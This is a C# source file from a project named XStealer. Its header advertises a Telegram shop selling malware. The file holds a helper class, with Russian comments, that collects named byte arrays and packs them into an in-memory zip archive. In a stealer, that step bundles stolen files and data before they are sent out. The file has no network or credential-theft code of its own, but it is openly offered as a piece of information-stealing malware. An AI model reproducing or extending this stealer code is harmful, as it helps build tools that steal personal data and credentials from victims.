// By https://t.me/devxstudio
// https://t.me/devx_channel
// SHOP MALWARE: https://t.me/devxstudiobot
namespace XStealer
{
    using System.Collections.Generic;
    using System.IO;
    using System.IO.Compression;
    using System.Linq;

    public static class ZipEx
    {
        private static readonly List<KeyValuePair<string, byte[]>> listkeyvaluepair = new List<KeyValuePair<string, byte[]>>();

        /// <summary>
        /// Добавить набор данных в список List
        /// </summary>
        /// <param name="filename">Имя файла содержащие данные</param>
        /// <param name="streamArray">Байтовый массив данных</param>
        /// <returns></returns>
        public static bool AddKeyPairStream(string filename, byte[] streamArray)
        {
            try
            {
                if (streamArray.Any()) // Проверка массива байт на данные (убирает пустые файлы)
                {
                    listkeyvaluepair.Add(new KeyValuePair<string, byte[]>(filename, streamArray));
                    return true;
                }
            }
            catch { }
            return false;
        }

        /// <summary>
        /// Метод для записи архива с данными в памяти
        /// </summary>
        /// <param name="files">Словарь с ключами и значениями для записи</param>
        /// <returns></returns>
        public static byte[] ZipListFiles()
        {
            // Поток для записи архива в памяти
            using var ms = new MemoryStream { Position = 0 };
            try
            {
                // Создание архива (с обновлением) и открытой до записью в архив
                using var archive = new ZipArchive(ms, ZipArchiveMode.Update, true);
                
                // Перебираем коллекцию данных
                foreach (KeyValuePair<string, byte[]> file in listkeyvaluepair)
                {
                    string VirtualFile = file.Key.Replace("/", @"\"); // Путь хранения файла
                    byte[] DataFile = file.Value; // Данные для записи в файл

                    // Читаем уже существующий файл или создаём новый
                    ZipArchiveEntry Zentry = archive.GetEntry(VirtualFile) ?? archive.CreateEntry(VirtualFile);
                    using Stream entryStream = Zentry.Open(); // Открываем файл для записи
                    entryStream.Seek(0, SeekOrigin.End); // Перематываем поток в конец для предотвращения перезаписи уже существующих данных
                    entryStream.Write(DataFile, 0, DataFile.Length); // Записываем данные в файл

                    //using var writer = new BinaryWriter(entryStream); // Поток файл в который записываем данные
                    //writer.Write(DataFile); // Записывем данные в файл
                    //writer.Flush(); // Освобождаем буффер записи
                }
            }
            catch { }
            return ms?.ToArray() ?? ms.GetBuffer() ?? null; // Возвращаем архив с данными 
        }
    }
}